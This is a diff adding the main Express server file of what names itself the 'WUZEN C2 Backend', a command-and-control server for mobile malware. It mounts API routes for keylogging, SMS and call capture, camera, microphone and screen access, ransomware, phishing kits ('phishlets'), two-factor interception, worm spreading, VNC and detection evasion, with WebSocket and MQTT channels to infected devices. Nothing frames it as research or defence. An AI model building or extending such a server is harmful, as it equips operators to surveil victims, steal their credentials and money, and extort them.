@@ -1,0 +1,139 @@
+const express = require('express');
+const cors = require('cors');
+const helmet = require('helmet');
+const compression = require('compression');
+const rateLimit = require('express-rate-limit');
+const winston = require('winston');
+const expressWinston = require('express-winston');
+const { createServer } = require('http');
+const WebSocket = require('ws');
+const mqtt = require('mqtt');
+const dotenv = require('dotenv');
+const path = require('path');
+
+dotenv.config();
+
+const app = express();
+const server = createServer(app);
+
+// Logger
+const logger = winston.createLogger({
+  level: 'info',
+  format: winston.format.combine(
+    winston.format.timestamp(),
+    winston.format.json()
+  ),
+  transports: [
+    new winston.transports.Console(),
+    new winston.transports.File({ filename: path.join(__dirname, '../logs/error.log'), level: 'error' }),
+    new winston.transports.File({ filename: path.join(__dirname, '../logs/combined.log') })
+  ]
+});
+
+// Middleware
+app.use(helmet({
+  contentSecurityPolicy: false,
+  crossOriginEmbedderPolicy: false
+}));
+app.use(cors({ origin: '*', credentials: true }));
+app.use(compression());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+app.use(expressWinston.logger({
+  winstonInstance: logger,
+  meta: true,
+  msg: 'HTTP {{req.method}} {{req.url}}',
+  expressFormat: true,
+  colorize: false
+}));
+
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 1000,
+  message: { error: 'Too many requests' }
+});
+app.use('/api/', limiter);
+
+// Serve frontend static files in production
+if (process.env.NODE_ENV === 'production') {
+  app.use(express.static(path.join(__dirname, '../../frontend/dist')));
+}
+
+// Database & Cache
+const db = require('./utils/db');
+const redis = require('./utils/redis');
+
+// WebSocket Server
+const wss = new WebSocket.Server({ server, path: '/ws' });
+require('./websocket/handler')(wss, logger);
+
+// MQTT Client
+const mqttClient = mqtt.connect(
+  `mqtt://${process.env.MQTT_BROKER_HOST || 'localhost'}:${process.env.MQTT_BROKER_PORT || 1883}`,
+  { reconnectPeriod: 5000 }
+);
+require('./mqtt/handler')(mqttClient, logger);
+
+// Routes
+app.use('/api/auth', require('./routes/auth'));
+app.use('/api/devices', require('./routes/devices'));
+app.use('/api/commands', require('./routes/commands'));
+app.use('/api/keylogs', require('./routes/keylogs'));
+app.use('/api/sms', require('./routes/sms'));
+app.use('/api/calls', require('./routes/calls'));
+app.use('/api/contacts', require('./routes/contacts'));
+app.use('/api/notifications', require('./routes/notifications'));
+app.use('/api/clipboard', require('./routes/clipboard'));
+app.use('/api/location', require('./routes/location'));
+app.use('/api/camera', require('./routes/camera'));
+app.use('/api/microphone', require('./routes/microphone'));
+app.use('/api/screen', require('./routes/screen'));
+app.use('/api/files', require('./routes/files'));
+app.use('/api/ransomware', require('./routes/ransomware'));
+app.use('/api/injections', require('./routes/injections'));
+app.use('/api/phishlets', require('./routes/phishlets'));
+app.use('/api/tfa', require('./routes/tfa'));
+app.use('/api/apps', require('./routes/apps'));
+app.use('/api/processes', require('./routes/processes'));
+app.use('/api/network', require('./routes/network'));
+app.use('/api/worm', require('./routes/worm'));
+app.use('/api/ats', require('./routes/ats'));
+app.use('/api/toolkit', require('./routes/toolkit'));
+app.use('/api/users', require('./routes/users'));
+app.use('/api/dashboard', require('./routes/dashboard'));
+app.use('/api/settings', require('./routes/settings'));
+app.use('/api/logs', require('./routes/logs'));
+app.use('/api/biometrics', require('./routes/biometrics'));
+app.use('/api/vnc', require('./routes/vnc'));
+app.use('/api/push', require('./routes/push'));
+app.use('/api/launch', require('./routes/launch'));
+app.use('/api/firewall', require('./routes/firewall'));
+app.use('/api/evasion', require('./routes/evasion'));
+app.use('/api/hardware', require('./routes/hardware'));
+
+// Health check
+app.get('/health', (req, res) => {
+  res.json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+// Serve frontend for SPA routes in production
+if (process.env.NODE_ENV === 'production') {
+  app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, '../../frontend/dist/index.html'));
+  });
+}
+
+// Error handler
+app.use((err, req, res, next) => {
+  logger.error(err.stack);
+  res.status(500).json({ error: 'Internal server error' });
+});
+
+const PORT = process.env.PORT || 3001;
+server.listen(PORT, '0.0.0.0', () => {
+  logger.info(`WUZEN C2 Backend running on 0.0.0.0:${PORT}`);
+});
+
+module.exports = { app, wss, mqttClient };
